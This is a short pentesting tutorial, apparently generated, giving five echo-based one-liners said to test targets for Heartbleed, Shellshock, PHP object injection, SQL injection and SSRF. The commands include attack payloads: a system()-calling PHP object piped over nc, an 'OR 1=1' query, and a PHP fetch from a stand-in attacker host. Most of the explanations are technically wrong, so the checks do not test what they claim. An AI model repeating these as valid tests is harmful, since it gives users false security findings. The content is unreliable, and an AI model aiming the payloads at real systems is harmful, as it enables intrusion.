Here are some examples of using the echo command for pentesting:
<br>
<br>
1. Testing if a server is vulnerable to Heartbleed SSL vulnerability:
```
echo -e "HELO \nQUIT" | openssl s_client -connect <target_host>:<target_port> -tlsextdebug 2>&1 | grep 'server extension "heartbeat" (id=15)'
```
*This command sends a specially crafted message to the server and checks if it responds with the "heartbeat" server extension, indicating that it is vulnerable to the Heartbleed SSL vulnerability.*

2. Checking if a target is vulnerable to Shellshock:
```
echo "() { :; }; echo vulnerable" | bash -c "echo this is a test"
```
*This command sends a specially crafted environment variable to the target's Bash shell and checks if it responds with the word "vulnerable", indicating that it is vulnerable to the Shellshock vulnerability.*

3. Testing if a target is vulnerable to PHP Object Injection:
```
echo '<?php class Test { public $cmd = "ls -la"; function __destruct() { system($this->cmd); } } $t = new Test; unserialize(serialize($t)); ?>' > payload.txt
cat payload.txt | nc -nv <target_host> <target_port>
```
*This command sends a specially crafted serialized PHP object to the target and checks if it executes the command "ls -la", indicating that it is vulnerable to PHP Object Injection.*

4. Checking if a target is vulnerable to SQL injection:
```
echo "SELECT * FROM users WHERE id=1 OR 1=1; --" | mysql -h <target_host> -u <username> -p<password> <database_name>
```
*This command sends a SQL query to the target's MySQL database and checks if it returns all records from the "users" table, indicating that it is vulnerable to SQL injection.*

5. Testing if a target is vulnerable to Server-Side Request Forgery (SSRF):
```
echo "<?php echo file_get_contents('http://<attacker_ip>/secret_file.txt'); ?>" > payload.php
curl -X POST -d "@payload.php" <target_url>
```
*This command sends a PHP payload to the target's server and checks if it sends a request to the attacker's server to retrieve a secret file, indicating that it is vulnerable to SSRF.*

